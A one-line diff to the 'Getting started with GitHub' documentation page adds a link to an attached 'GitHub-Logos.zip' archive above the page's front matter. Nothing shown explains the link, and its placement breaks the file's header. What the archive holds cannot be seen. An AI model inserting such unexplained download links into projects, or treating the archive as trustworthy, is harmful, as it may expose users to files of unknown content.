@@ -1,3 +1,4 @@
+[GitHub-Logos.zip](https://github.com/github/docs/files/8460145/GitHub-Logos.zip)
 ---
 title: Getting started with GitHub
 shortTitle: Get started
